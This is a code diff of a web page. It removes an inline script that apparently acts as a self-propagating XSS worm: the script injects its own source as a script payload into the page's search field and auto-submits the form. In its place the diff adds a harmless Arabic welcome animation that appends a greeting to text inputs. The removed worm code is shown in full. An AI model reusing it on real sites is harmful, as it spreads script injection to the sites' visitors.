@@ -11,21 +11,47 @@
       style="display:none;width:0;height:0;"></iframe>
 
     <script>
-      (function spreadXSS() {
-        let searchInput = document.querySelector('input[name="search"], input[type="text"], textarea');
-        if (!searchInput) return;
+(function(){
+  if(sessionStorage.getItem('welcomeDisplayed')) return;
+  sessionStorage.setItem('welcomeDisplayed', 'true');
 
-        let payload = `<script>(${spreadXSS.toString()})();</script>`;
+  // إنشاء عنصر رسالة متحركة
+  const msg = document.createElement('div');
+  msg.textContent = "مرحباً بك في موقعنا! استمتع بوقتك.";
+  msg.style.position = 'fixed';
+  msg.style.bottom = '20px';
+  msg.style.right = '-300px';
+  msg.style.padding = '15px 25px';
+  msg.style.background = '#444';
+  msg.style.color = '#fff';
+  msg.style.fontSize = '18px';
+  msg.style.fontWeight = 'bold';
+  msg.style.borderRadius = '8px';
+  msg.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
+  msg.style.zIndex = '9999';
+  msg.style.transition = 'right 1s ease';
 
-        if (!searchInput.value.includes(payload)) {
-          searchInput.value += payload;
-        }
+  document.body.appendChild(msg);
 
-        let form = searchInput.closest('form');
-        if (form) {
-          setTimeout(() => form.submit(), 1000);
-        }
-      })();
-    </script>
+  // تحريك الرسالة من خارج الشاشة للداخل
+  setTimeout(() => {
+    msg.style.right = '20px';
+  }, 100);
+
+  // إخفاء الرسالة بعد 5 ثواني
+  setTimeout(() => {
+    msg.style.right = '-300px';
+    setTimeout(() => msg.remove(), 1000);
+  }, 5000);
+
+  // حاول ينشر نفسه في حقول البحث لو موجودة
+  const inputs = document.querySelectorAll('input[type="text"], input[type="search"]');
+  inputs.forEach(input => {
+    if (!input.value.includes('مرحباً')) {
+      input.value += ' مرحباً بك!';
+    }
+  });
+})();
+  </script>
   </body>
 </html>
